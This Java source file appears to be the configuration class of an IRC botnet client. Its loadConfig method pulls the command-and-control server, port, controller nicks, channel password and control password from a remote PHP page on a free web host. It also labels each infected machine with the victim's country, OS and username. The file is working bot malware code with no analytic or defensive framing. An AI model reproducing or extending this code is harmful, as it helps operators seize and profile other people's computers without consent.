
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
/**
 *
 * @author Nathan
 */
public class Config {

    public static final String CONF_URL = "http://abcdefghijklmnopqrstuvwxyz.110mb.com/lol.php";
    public static final String CONF_BK = "http://abcdefghijklmnopqrstuvwxyz.110mb.com/lol.php";
    public static String nick = "[" + System.getProperty("user.country") + "][" + getOSIdentifyer() + "][" + Misc.getUsername().replace(" ", "_") + "][" + getUniqueID() + "]";
    public static List<String> controllors = new ArrayList<String>();
    public static String dataHolder;
    public static String CONTROL_PASS;
    public static boolean outputEnabled = true;
    public static String channel;
    public static String channelPass;
    public static String host;
    public static int port;
    public static final Epic CREDITS = new Epic(new String[]{"super_", "Mark", "Richard", "<3 All"});

    public static void loadConfig() throws IOException {
        BufferedReader br = null;
        try {
            br = new BufferedReader(new InputStreamReader(new URL(CONF_URL).openStream()));
        } catch (Exception e) {
            br = new BufferedReader(new InputStreamReader(new URL(CONF_BK).openStream()));
        }
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) {
            sb.append(line);
            System.out.println(line);
        }
        try {
            String[] tokens = sb.toString().split("<br>");
            host = tokens[0].substring(7);
            port = Integer.parseInt(tokens[1].substring(5));
            String[] cont = tokens[2].substring(5).split(", ");
            for (int i = 0; i < cont.length; i++) {
                controllors.add(cont[i]);
            }
            channel = tokens[3].substring(8);
            channelPass = tokens[4].substring(12);
            CONTROL_PASS = tokens[5].substring(9);
            //right lemme chec the timeout on that server
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static String byteToString(String string) {
        String[] toBytes = string.split(" ");
        byte[] byteArray = new byte[toBytes.length];

        int pos = 0;
        for (String s : toBytes) {
            byteArray[pos++] = Byte.decode(s);
        }
        return new String(byteArray);
    }

    public static String getOSIdentifyer() {
        String os = System.getProperty("os.name");
        if (os.contains("XP") || os.contains("xp") || os.contains("Xp")) {
            return "XP";
        }
        if (os.contains("VISTA") || os.contains("Vista") || os.contains("vista")) {
            return "VS";
        }
        if (os.contains("Linux") || os.contains("lin") || os.contains("LINUX") || os.contains("linux")) {
            return "LIN";
        } else {
            return "UNK";
        }
    }

    public static String getUniqueID() {
        String str = new String("QAa0bcLdUK2eHfJgTP8XhiFj61DOklNm9nBoI5pGqYVrs3CtSuMZvwWx4yE7zR");
        StringBuffer sb = new StringBuffer();
        Random r = new Random();
        int te = 0;
        for (int i = 1; i <= 4; i++) {
            te = r.nextInt(62);
            sb.append(str.charAt(te));
        }
        return sb.toString();
    }
}

class Epic {

    boolean fuckingEpic;

    public Epic(Object o) {
        fuckingEpic = true;
    }
}
